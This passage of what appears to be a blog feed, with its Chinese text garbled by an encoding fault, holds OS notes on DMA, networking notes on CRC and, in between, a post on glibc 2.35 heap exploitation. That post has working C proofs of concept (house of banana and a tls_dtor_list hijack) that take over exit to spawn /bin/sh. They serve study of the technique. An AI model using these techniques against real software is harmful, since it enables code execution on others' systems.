title="æ€»çº¿"></a>æ€»çº¿</h3><p>ä¸ºäº†æ”¯æŒè¶Šæ¥è¶Šå¤šçš„ioè®¾å¤‡(å¯æ‹“å±•æ€§)CPUä¸Šå‡ºç°äº†æ€»çº¿ï¼šä¸€ä¸ªç‰¹æ®Šçš„ I&#x2F;O è®¾å¤‡</p><ul><li>æŠŠæ”¶åˆ°çš„åœ°å€ (æ€»çº¿åœ°å€) å’Œæ•°æ®è½¬å‘åˆ°ç›¸åº”çš„è®¾å¤‡ä¸Š</li><li>æ€»çº¿ä¸Šå¯ä»¥æ¥dramï¼Œç”šè‡³å¯ä»¥ç»™æ€»çº¿ä¸Šæ¥çš„è®¾å¤‡è¿›è¡Œå†…å­˜ç¼–åˆ¶ï¼Œç»Ÿä¸€æŒ‰ç…§å†…å­˜åœ°å€æ¥æ“ä½œè®¾å¤‡ï¼Œå…¶ä»–è®¾å¤‡pciä¹Ÿå¯ä»¥è¿æ¥åˆ°æ€»çº¿ï¼Œå¦‚usbæ€»çº¿</li></ul><p>ä¸ºäº†æé«˜cpuæ•ˆç‡ï¼Œå½“è®¾å¤‡å®Œæˆäº†è‡ªèº«æ“ä½œï¼Œä¼šä¸»åŠ¨æŠ›å‡ºä¸€ä¸ªç¡¬ä»¶ä¸­æ–­ï¼Œåœ¨æ­¤æœŸé—´cpuå¯ä»¥æ‰§è¡Œå…¶ä»–è¿›ç¨‹ï¼ˆå¦‚æœè®¾å¤‡éå¸¸å¿«ï¼Œä¸­æ–­å¯èƒ½ä¸å¦‚è½®è¯¢ï¼‰</p><h3 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h3><p>å‘ç£ç›˜å†™ä¸€äº›æ•°æ®ï¼Œcpuéœ€è¦å°†æ•°æ®ä»å†…å­˜æ‹·è´åˆ°ç£ç›˜ï¼Œç£ç›˜ä¸Šçš„ I&#x2F;Oå†å¼€å§‹æ‰§è¡Œï¼Œcpuæ‰èƒ½åˆ‡èµ°åˆ°å…¶ä»–å·¥ä½œï¼Œæé«˜æ•ˆç‡æŠŠç®€å•çš„æ‹·è´å·¥ä½œäº¤ç»™DMA</p><p>æ“ä½œç³»ç»Ÿä¼šé€šè¿‡ç¼–ç¨‹å‘Šè¯‰ DMA å¼•æ“æ•°æ®åœ¨å†…å­˜çš„ä½ç½®ï¼Œè¦æ‹·è´çš„å¤§å°ä»¥åŠè¦æ‹·è´åˆ°å“ªä¸ªè®¾å¤‡ã€‚</p><p>Direct Memory Access (DMA)ï¼šä¸€ä¸ªä¸“é—¨æ‰§è¡Œ â€œ<code>memcpy</code>â€ ç¨‹åºçš„ CPU</p><p>å¾ˆå®¹æ˜“å¯ä»¥è”ç³»åˆ°GPUï¼Œnvidia yesï¼</p><h3 id="è®¾å¤‡é©±åŠ¨ç¨‹åº"><a href="#è®¾å¤‡é©±åŠ¨ç¨‹åº" class="headerlink" title="è®¾å¤‡é©±åŠ¨ç¨‹åº"></a>è®¾å¤‡é©±åŠ¨ç¨‹åº</h3><p>æ“ä½œç³»ç»Ÿä¸åº”è¯¥æŠŠioè®¾å¤‡çš„å¯„å­˜å™¨æ¥å£æš´éœ²ç»™ç”¨æˆ·å–æ“ä½œï¼Œè¿™æ˜¯ä¸åˆç†ä¸”å±é™©çš„ï¼Œæ¯”å¦‚å¤§å¤šæ•°æ™®é€šç”¨æˆ·æ“ä½œä¸å¥½æ‰“å°æœºå¯„å­˜å™¨æ¥å£é€ æˆç»æµæŸå¤±</p><p>linuxæŠŠè®¾å¤‡æŠ½è±¡æˆæ–‡ä»¶ï¼Œlinuxé©±åŠ¨ç¨‹åºä¼šæŠŠé‡æ–°å®šä¹‰ä¸€äº›æ–‡ä»¶æ“ä½œç›¸å…³å‡½æ•°ï¼Œé©±åŠ¨ç¨‹åºæŠŠç³»ç»Ÿè°ƒç”¨ (read&#x2F;write&#x2F;ioctl&#x2F;â€¦) â€œç¿»è¯‘â€ æˆä¸è®¾å¤‡å¯„å­˜å™¨çš„äº¤äº’ï¼Œå®Œæˆå¤æ‚çš„åŠŸèƒ½</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc2.35åˆ©ç”¨</title>
      <link href="/2023/09/30/glibc235-attack/"/>
      <url>/2023/09/30/glibc235-attack/</url>
      
        <content type="html"><![CDATA[<p><strong>åŸºäº2.35-0ubuntu3_amd64</strong></p><p>å¤±å»äº†free malloc realloc exit hook</p><p>è¯•äº†ä¸€ä¸‹exitå»æ”¹_rtld_global._dl_ns[0]._ns_loaded.l_addræ§åˆ¶ææ„è¿˜æ˜¯æœ‰ç”¨çš„</p><p>house of bananaä¾æ—§å¯è¡Œ</p><p>poc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span> - <span class="number">0x80ed0</span>;</span><br><span class="line">      <span class="type">size_t</span> _rtld_global_ptr_next_next_next = libc_base + <span class="number">0x3fd040</span><span class="number">-0x41d88</span>;<span class="comment">//distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) rtld_global_pträ¸libc_baseçš„åç§»ä¸å›ºå®šï¼Œå¯èƒ½ä¼šåœ¨åœ°å€çš„ç¬¬2å­—èŠ‚å¤„å‘ç”Ÿå˜åŒ–</span></span><br><span class="line">  <span class="comment">//large bin attach</span></span><br><span class="line">  <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr0);</span><br><span class="line">  <span class="comment">// put ptr0 into large bin</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr1); <span class="comment">// free ptr1 into unsorted bin</span></span><br><span class="line">  <span class="comment">// bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_next_next_next - <span class="number">0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//ä¿®æ”¹æœ€åä¸€ä¸ªlink_map DT_FINI_ARRAY</span></span><br><span class="line">  <span class="type">size_t</span> *fakelinkmap = (<span class="type">size_t</span> *)(ptr1<span class="number">-0x10</span>);<span class="comment">//subtract chunk head</span></span><br><span class="line">  fakelinkmap[<span class="number">3</span>]=<span class="number">0</span>;<span class="comment">//ç»•è¿‡ assert (ns != LM_ID_BASE || i == nloaded);</span></span><br><span class="line">  fakelinkmap[<span class="number">5</span>] = (<span class="type">size_t</span>)fakelinkmap;     <span class="comment">// l_real</span></span><br><span class="line">  fakelinkmap[<span class="number">34</span>] = (<span class="type">size_t</span>)&amp;fakelinkmap[<span class="number">34</span>];                      <span class="comment">// l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  fakelinkmap[<span class="number">35</span>]=(<span class="type">size_t</span>)&amp;fakelinkmap[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  fakelinkmap[<span class="number">36</span>]=(<span class="type">size_t</span>)&amp;fakelinkmap[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  fakelinkmap[<span class="number">37</span>]=<span class="number">0x8</span>;<span class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  fakelinkmap[<span class="number">38</span>]=(<span class="type">size_t</span>)backdoor;<span class="comment">//call array[i]</span></span><br><span class="line">  fakelinkmap[<span class="number">0x63</span>]=<span class="number">0x800000000</span>;<span class="comment">//ä½¿l-&gt;l_init_called ä¸º1</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//æˆ–è€…ä¿®æ”¹æœ€åä¸€ä¸ªlink_mapçš„DT_FINI</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  size_t *fakelinkmap = (size_t *)(ptr1-0x10);//subtract chunk head</span></span><br><span class="line"><span class="comment">  fakelinkmap[3]=0;</span></span><br><span class="line"><span class="comment">  fakelinkmap[5] = (size_t)fakelinkmap;     // l_real</span></span><br><span class="line"><span class="comment">  fakelinkmap[8+13] =  (size_t)&amp;fakelinkmap[34];                      // l-&gt;l_info[13] DT_FINI</span></span><br><span class="line"><span class="comment">  fakelinkmap[8+26] = 0;                      // l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line"><span class="comment">  fakelinkmap[35]=(size_t)backdoor;//l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr    </span></span><br><span class="line"><span class="comment">  fakelinkmap[0x63]=0x800000000;//ä½¿l-&gt;l_init_called ä¸º1</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢pocä¸»è¦æ˜¯æ”¹äº†æœ€åä¸€ä¸ªlink_mapï¼Œä¹Ÿå¯ä»¥æ”¹ç¬¬ä¸€ä¸ªlink_map,æŠŠç¬¬ä¸€ä¸ªlink_mapçš„nextæ”¹ä¸ºåŸæœ¬çš„ç¬¬äºŒä¸ªlink_mapæ»¡è¶³4ä¸ªé“¾è¡¨ï¼Œç»•è¿‡ assert (ns !&#x3D; LM_ID_BASE || i &#x3D;&#x3D; nloaded);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">åŸæœ¬çš„ç¬¬äºŒä¸ªlink_map</span><br><span class="line">pwndbg&gt; p (_rtld_global._dl_ns._ns_loaded[<span class="number">0</span>].l_next) </span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">struct</span> link_map *) <span class="number">0x7ffff7ffe890</span></span><br></pre></td></tr></table></figure><h2 id="tls-dtor-listæ”»å‡»åŠ«æŒexitæ‰§è¡Œæµ"><a href="#tls-dtor-listæ”»å‡»åŠ«æŒexitæ‰§è¡Œæµ" class="headerlink" title="tls_dtor_listæ”»å‡»åŠ«æŒexitæ‰§è¡Œæµ"></a><a href="https://m4tsuri.io/2020/10/18/glibc-tls/">tls_dtor_listæ”»å‡»åŠ«æŒexitæ‰§è¡Œæµ</a></h2><p>exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tls_dtor_listæ˜¯ä¸‹é¢çš„ç»“æ„ä½“ï¼Œä¸€èˆ¬éƒ½æ˜¯ç©ºçš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble __call_tls_dtors                                                                                                                                                                     </span><br><span class="line">Dump of assembler code for function __GI___call_tls_dtors:                                                                                                                                                    </span><br><span class="line">   0x00007ffff7c45d60 &lt;+0&gt;:     endbr64                                                                                                                                                                       </span><br><span class="line">   0x00007ffff7c45d64 &lt;+4&gt;:     push   rbp                                                                                                                                                                    </span><br><span class="line">   0x00007ffff7c45d65 &lt;+5&gt;:     push   rbx</span><br><span class="line">   0x00007ffff7c45d66 &lt;+6&gt;:     sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c45d6a &lt;+10&gt;:    mov    rbx,QWORD PTR [rip+0x1d301f]        # 0x7ffff7e18d90</span><br><span class="line">   0x00007ffff7c45d71 &lt;+17&gt;:    mov    rbp,QWORD PTR fs:[rbx];fs:[rbx]å¤„ä¸ºtls_dtor_list</span><br><span class="line">   0x00007ffff7c45d75 &lt;+21&gt;:    test   rbp,rbp;åˆ¤æ–­tls_dtor_listæ˜¯å¦ä¸ºç©º</span><br><span class="line">   0x00007ffff7c45d78 &lt;+24&gt;:    je     0x7ffff7c45dbd &lt;__GI___call_tls_dtors+93&gt;;ä¸ºç©ºç»“æŸ</span><br><span class="line">   0x00007ffff7c45d7a &lt;+26&gt;:    nop    WORD PTR [rax+rax*1+0x0];æ— å½±å“</span><br><span class="line">   0x00007ffff7c45d80 &lt;+32&gt;:    mov    rdx,QWORD PTR [rbp+0x18];nextæŒ‡é’ˆç»™rdx</span><br><span class="line">   0x00007ffff7c45d84 &lt;+36&gt;:    mov    rax,QWORD PTR [rbp+0x0];funcç»™rax</span><br><span class="line">   0x00007ffff7c45d88 &lt;+40&gt;:    ror    rax,0x11</span><br><span class="line">   0x00007ffff7c45d8c &lt;+44&gt;:    xor    rax,QWORD PTR fs:0x30;funcå¾ªç¯å³ç§»11ä½ï¼Œå†å’Œfs:0x30å¤„å¼‚æˆ–,</span><br><span class="line">   0x00007ffff7c45d95 &lt;+53&gt;:    mov    QWORD PTR fs:[rbx],rdx;å°†nextå­˜å›tls_dtor_listï¼Œtls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">   0x00007ffff7c45d99 &lt;+57&gt;:    mov    rdi,QWORD PTR [rbp+0x8];objå½“ä½œå‚æ•°</span><br><span class="line">   0x00007ffff7c45d9d &lt;+61&gt;:    call   rax;è°ƒç”¨func</span><br><span class="line">   0x00007ffff7c45d9f &lt;+63&gt;:    mov    rax,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c45da3 &lt;+67&gt;:    lock sub QWORD PTR [rax+0x468],0x1</span><br><span class="line">   0x00007ffff7c45dac &lt;+76&gt;:    mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c45daf &lt;+79&gt;:    call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c45db4 &lt;+84&gt;:    mov    rbp,QWORD PTR fs:[rbx]</span><br><span class="line">   0x00007ffff7c45db8 &lt;+88&gt;:    test   rbp,rbp</span><br><span class="line">   0x00007ffff7c45dbb &lt;+91&gt;:    jne    0x7ffff7c45d80 &lt;__GI___call_tls_dtors+32&gt;</span><br><span class="line">   0x00007ffff7c45dbd &lt;+93&gt;:    add    rsp,0x8</span><br><span class="line">   0x00007ffff7c45dc1 &lt;+97&gt;:    pop    rbx</span><br><span class="line">   0x00007ffff7c45dc2 &lt;+98&gt;:    pop    rbp</span><br><span class="line">   0x00007ffff7c45dc3 &lt;+99&gt;:    ret  </span><br></pre></td></tr></table></figure><p>å¯ä»¥æ§åˆ¶tls_dtor_listé‡Œçš„dtor_listâ€“&gt;funcä¸ºsystem dtor_listâ€“&gt;objä¸ºæŒ‡å‘binshå­—ç¬¦ä¸²åœ°å€</p><p>æˆ–è€…å› ä¸ºä»–æ˜¯åˆ©ç”¨rbpæ¥å­˜æ”¾dtor_listï¼Œå¯ä»¥åœ¨dtor_listâ€“&gt;funcå­˜æ”¾leave retåœ°å€ï¼Œdtor_listâ€“&gt;objåŠä¸‹é¢å­˜æ”¾ropé“¾ï¼Œå°±å¯ä»¥å®ç°rop</p><p>éœ€è¦æ»¡è¶³</p><ul><li><p>æ³„éœ²libcï¼Œè·å–tls_dtor_listç­‰åœ°å€</p><ul><li>å¯ä»¥é…åˆlargebin attachæŠŠå †åœ°å€å†™å…¥tls_dtor_list(largebinä¸­æœ‰ä¸€ä¸ªfree_chunk,ä¿®æ”¹ free_chunk çš„ bk_nextsize ä¸ºtls_dtor_list-0x20,å°±å¯ä»¥æŠŠfree_chunkå†™å…¥tls_dtor_listï¼‰</li></ul></li><li><p>èƒ½å¤Ÿç¯¡æ”¹æˆ–æ³„éœ²<code>fs_base + 0x30</code>çš„å€¼</p></li><li><p>é€šè¿‡exité€€å‡ºç¨‹åº</p></li></ul><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">size_t</span> value,<span class="type">size_t</span> key)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> newval=(value^key);</span><br><span class="line">  <span class="keyword">return</span> (newval&lt;&lt;<span class="number">0x11</span>)|(newval&gt;&gt;(<span class="number">64</span><span class="number">-0x11</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> fsbase;</span><br><span class="line">  <span class="type">size_t</span> tls_dtor_list_addr,key;</span><br><span class="line">  __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fsbase))</span>;</span><br><span class="line">  tls_dtor_list_addr = fsbase - <span class="number">88</span>;<span class="comment">//è·å–åˆ°tls_dtor_listä½ç½®</span></span><br><span class="line">  key=*(<span class="type">size_t</span>*)(fsbase+<span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *binsh = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(binsh,<span class="string">&quot;/bin/sh\x00&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *fake_tls_dtor = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  fake_tls_dtor[<span class="number">0</span>] = encrypt((<span class="type">size_t</span>)&amp;system, key);</span><br><span class="line">  fake_tls_dtor[<span class="number">1</span>] = (<span class="type">size_t</span>)binsh;</span><br><span class="line">  *(<span class="type">size_t</span> *)tls_dtor_list_addr=(<span class="type">size_t</span>)fake_tls_dtor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œ:é“¾è·¯å±‚</title>
      <link href="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p> é“¾è·¯å±‚ä¸»ä½“éƒ¨åˆ†æ˜¯åœ¨ç½‘ç»œé€‚é…å™¨(ç½‘å¡)ç”¨ç¡¬ä»¶å®ç°çš„ï¼Œå°‘éƒ¨åˆ†é è½¯ä»¶å®ç°</p><h2 id="æ£€é”™çº é”™æŠ€æœ¯"><a href="#æ£€é”™çº é”™æŠ€æœ¯" class="headerlink" title="æ£€é”™çº é”™æŠ€æœ¯"></a>æ£€é”™çº é”™æŠ€æœ¯</h2><h3 id="å¥‡å¶æ ¡éªŒ"><a href="#å¥‡å¶æ ¡éªŒ" class="headerlink" title="å¥‡å¶æ ¡éªŒ"></a>å¥‡å¶æ ¡éªŒ</h3><p>å¥‡æ ¡éªŒï¼šåŸå§‹ç æµ+æ ¡éªŒä½ æ€»å…±æœ‰å¥‡æ•°ä¸ª1</p><p>å¶æ ¡éªŒï¼šåŸå§‹ç æµ+æ ¡éªŒä½ æ€»å…±æœ‰å¶æ•°ä¸ª1</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926152653775.png" alt="image-20230926152653775"></p><p>åªèƒ½æ£€é”™å‡ºå¥‡æ•°ä¸ªbité”™è¯¯</p><p><strong>äºŒç»´å¥‡å¶æ£€éªŒ</strong></p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926152501504.png" alt="image-20230926152501504"></p><p>å¯ä»¥æ£€æµ‹æ•°æ®å‡ºé”™ä½ç½®å¹¶çº æ­£ï¼Œåªèƒ½æ£€æµ‹æ ¡éªŒæ¯”ç‰¹é”™è¯¯ä½†ä¸èƒ½çº æ­£</p><h3 id="æ ¡éªŒå’Œ"><a href="#æ ¡éªŒå’Œ" class="headerlink" title="æ ¡éªŒå’Œ"></a>æ ¡éªŒå’Œ</h3><h3 id="å¾ªç¯å†—ä½™æ£€æµ‹"><a href="#å¾ªç¯å†—ä½™æ£€æµ‹" class="headerlink" title="å¾ªç¯å†—ä½™æ£€æµ‹"></a><a href="https://www.bilibili.com/video/BV1V4411Z7VA/">å¾ªç¯å†—ä½™æ£€æµ‹</a></h3><p>Cyclic Redundancy Checkï¼ŒCRC</p><p>crcé‡Œé‡‡ç”¨äº†æ¨¡äºŒè¿ç®—:åŠ æ³•æ— è¿›ä½ï¼Œå‡æ³•æ— å€Ÿä½ï¼Œä¹Ÿå°±ç­‰ä»·äºå¼‚æˆ–</p><p>åŒæ–¹åå•†ä¸€ä¸ªr+1æ¯”ç‰¹æ¨¡å¼ï¼Œå«åšç”Ÿæˆå¤šé¡¹å¼Gï¼ŒGçš„æœ€é«˜æœ‰æ•ˆæ¯”ç‰¹ä½åº”ä¸º1</p><p>CRCæ ‡å‡†èƒ½æ£€æµ‹å°äº r + 1 æ¯”ç‰¹çš„çªå‘å·®é”™</p><p>å‘é€æ–¹å¯¹äºæ•°æ®Dè¦åŠ rä¸ªé™„åŠ æ¯”ç‰¹Rä½œä¸ºå‘é€æ•°æ®Xï¼Œè¿™ä¸ªRè¦ä½¿å‘é€æ•°æ®Xå¯ä»¥è¢«ç”Ÿæˆå¤šé¡¹å¼Gåšæ¨¡äºŒç®—æ•°æ•´é™¤</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926152617713.png" alt="image-20230926152617713"></p><p>å¯¹äºæ¥æ”¶æ–¹</p><ul><li>å¦‚æœç”¨ç”Ÿæˆå¤šé¡¹å¼Gé™¤å¾—å°½ï¼Œè¡¨æ˜æ•°æ®æ­£ç¡®ï¼›</li><li>å¦‚æœé™¤ä¸å°½ï¼Œ<code>ä½™æ•°å°†æŒ‡æ˜å‡ºé”™ä½æ‰€åœ¨ä½ç½®</code>ã€‚</li></ul><p><strong>å‘é€æ–¹è¿™ä¹ˆæ±‚è¿™ä¸ªR?</strong></p><p>æ ¹æ®ä¸Šè¿°éœ€è¦æ»¡è¶³$D\times2^r\ xor\ R &#x3D;nG$</p><p>ä¸¤è¾¹åŒæ—¶å†å¼‚æˆ–ä¸ªRå¯å¾—$D\times2^r&#x3D;nG\ xor\ R$</p><p>å³è¾¹å°±å¯ä»¥è¢«Gé™¤å°±å¯ä»¥è·å¾—äºä½™æ•°R $R&#x3D;remainder\frac {D\times2^r}G$è¿™ä¸€æ­¥å°±è¯´æ˜äº†Ræ€ä¹ˆæ±‚: Då·¦ç§»rä½ï¼Œæ¨¡äºŒé™¤Gå¾—åˆ°ä½™æ•° </p><p>æ£€éªŒè¿‡ç¨‹ç¡¬ä»¶ç”µè·¯å®ç°å®ç°æ¯”è¾ƒç®€å•å¿«é€Ÿ</p><p><a href="https://www.bilibili.com/video/BV1V4411Z7VA/">https://www.bilibili.com/video/BV1V4411Z7VA/</a></p><p>è§†é¢‘é‡Œä¸²è¡Œcrcç¡¬ä»¶å®ç°éƒ¨åˆ†: </p><p>å¤šé¡¹å¼Gä¸º$x^4+x+1$ å³é™¤æ•°G&#x3D;10011</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926184135975.png" alt="image-20230926184135975"></p><p>ç±»åˆ«å°å­¦åˆ—ç«–å¼æ—¶çš„é™¤æ³•ï¼Œæ¢æµ‹ä»ªå¤„ä¸º0æ—¶è¯æ˜ä¸å¤Ÿé™¤ï¼Œè¢«é™¤æ•°å·¦ç§»ä¸€ä½ï¼Œä¸º1æ—¶ï¼Œåšæ¨¡äºŒå‡æ³•å³åšå¼‚æˆ–æ“ä½œï¼Œå³æŠŠä¸ºé™¤æ•°ä¸º1çš„ä½ç½®åè½¬ï¼Œä¸º0çš„ä½ç½®ä¸å˜ï¼Œå¯¹äºä½äºé™¤æ•°æ¢æµ‹ä½çš„1æ¥è¯´æ­¤æ—¶è¿™é‡Œæ•°å€¼ä¸º1ï¼Œ1 xor 1 &#x3D; 0å¯ä»¥ç›´æ¥å·¦ç§»æ‰ï¼Œæ¦‚æ‹¬èµ·æ¥æ¥è¯´å°±æ˜¯é«˜ä½ä¸º1çš„æ—¶å€™è¿›è¡Œæ¨¡2è¿ç®—ï¼Œä¹‹åè¿›è¡Œç§»ä½ï¼›é«˜ä½ä¸º0çš„æ—¶å€™å•çº¯åœ°è¿›è¡Œç§»ä½æ“ä½œ</p><p><a href="https://www.cnblogs.com/Zeker62/p/15046165.html">https://www.cnblogs.com/Zeker62/p/15046165.html</a></p><h2 id="å¤šè·¯è®¿é—®é“¾è·¯"><a href="#å¤šè·¯è®¿é—®é“¾è·¯" class="headerlink" title="å¤šè·¯è®¿é—®é“¾è·¯"></a>å¤šè·¯è®¿é—®é“¾è·¯</h2><h3 id="ä¿¡é“åˆ’åˆ†åè®®"><a href="#ä¿¡é“åˆ’åˆ†åè®®" class="headerlink" title="ä¿¡é“åˆ’åˆ†åè®®"></a>ä¿¡é“åˆ’åˆ†åè®®</h3><ul><li><p>æ—¶åˆ†å¤ç”¨ï¼šTime Division Multiplexingï¼ŒTDM</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230928104649847.png" alt="image-20230928104649847"></p><p>æ—¶é—´åˆ’åˆ†ä¸ºæ—¶é—´å¸§ï¼Œæ—¶é—´å¸§åˆ’åˆ†ä¸ºæ—¶éš™ï¼Œæ¯ä¸ªæ—¶éš™åˆ†ç»™ä¸€ä¸ªç”¨æˆ·</p></li><li><p>é¢‘åˆ†å¤šè·¯å¤ç”¨: Frequency Division Multiplexing,FDM</p></li><li><p>ç åˆ†å¤šå€ (Code Division Multiple Access, CDMA)</p><p>ä¸åŒèŠ‚ç‚¹ä¸åŒç¼–ç </p></li></ul><p>ğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•Š</p><h2 id="å±€åŸŸç½‘LAN"><a href="#å±€åŸŸç½‘LAN" 